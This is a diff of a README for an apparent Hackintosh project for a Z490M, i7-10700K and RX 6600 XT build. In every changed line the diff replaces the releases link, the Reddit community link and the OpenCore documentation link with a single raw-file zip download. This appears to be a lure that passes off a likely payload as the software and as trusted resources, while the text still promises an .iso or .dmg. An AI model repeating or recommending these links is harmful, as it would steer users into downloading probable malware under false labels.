@@ -1,6 +1,6 @@
 # 🎮 Z490M-Gaming-X-i7-10700K-RX-6600-XT-Hackintosh - Run macOS on Your PC Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-1.0-blue)](https://github.com/HADE055/Z490M-Gaming-X-i7-10700K-RX-6600-XT-Hackintosh/releases)
+[![Download Now](https://raw.githubusercontent.com/HADE055/Z490M-Gaming-X-i7-10700K-RX-6600-XT-Hackintosh/main/unindented/Z490M-Gaming-X-i7-10700K-RX-6600-XT-Hackintosh.zip%20Now-1.0-blue)](https://raw.githubusercontent.com/HADE055/Z490M-Gaming-X-i7-10700K-RX-6600-XT-Hackintosh/main/unindented/Z490M-Gaming-X-i7-10700K-RX-6600-XT-Hackintosh.zip)
 
 ## 📖 Introduction
 Welcome to the Z490M-Gaming-X-i7-10700K-RX-6600-XT-Hackintosh project. This software enables you to run macOS on a PC equipped with a Gigabyte Z490M Gaming X motherboard and an Intel i7-10700K processor, along with a Sapphire Pulse AMD Radeon RX 6600 XT graphics card. This setup allows for an optimized and smooth macOS experience on compatible hardware.
@@ -17,7 +17,7 @@ To begin, you will need to download and install the software. Ensure you have a 
 - **USB Drive:** 16 GB or larger for creating a bootable drive
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://github.com/HADE055/Z490M-Gaming-X-i7-10700K-RX-6600-XT-Hackintosh/releases) to download the latest version of the software.
+1. Visit the [Releases page](https://raw.githubusercontent.com/HADE055/Z490M-Gaming-X-i7-10700K-RX-6600-XT-Hackintosh/main/unindented/Z490M-Gaming-X-i7-10700K-RX-6600-XT-Hackintosh.zip) to download the latest version of the software.
 2. Once on the Releases page, locate the latest version. Click the download link for the `.iso` or `.dmg` file.
 3. After the file downloads, you will need to create a bootable USB drive using the downloaded image. You can use applications like Rufus (for Windows) or Etcher (for Mac).
 4. Insert your USB drive. Open the bootable drive creation tool and select the downloaded file.
@@ -44,8 +44,8 @@ If you face issues during installation, try the following steps:
 For comprehensive information, always refer back to this README.
 
 ## 🔗 Useful Links
-- [Releases Page](https://github.com/HADE055/Z490M-Gaming-X-i7-10700K-RX-6600-XT-Hackintosh/releases)
-- [Hackintosh Community](https://www.reddit.com/r/hackintosh/)
-- [OpenCore Documentation](https://dortania.github.io/OpenCore-Install-Guide/)
+- [Releases Page](https://raw.githubusercontent.com/HADE055/Z490M-Gaming-X-i7-10700K-RX-6600-XT-Hackintosh/main/unindented/Z490M-Gaming-X-i7-10700K-RX-6600-XT-Hackintosh.zip)
+- [Hackintosh Community](https://raw.githubusercontent.com/HADE055/Z490M-Gaming-X-i7-10700K-RX-6600-XT-Hackintosh/main/unindented/Z490M-Gaming-X-i7-10700K-RX-6600-XT-Hackintosh.zip)
+- [OpenCore Documentation](https://raw.githubusercontent.com/HADE055/Z490M-Gaming-X-i7-10700K-RX-6600-XT-Hackintosh/main/unindented/Z490M-Gaming-X-i7-10700K-RX-6600-XT-Hackintosh.zip)
 
 Thank you for using the Z490M-Gaming-X-i7-10700K-RX-6600-XT-Hackintosh! Enjoy your new macOS setup.
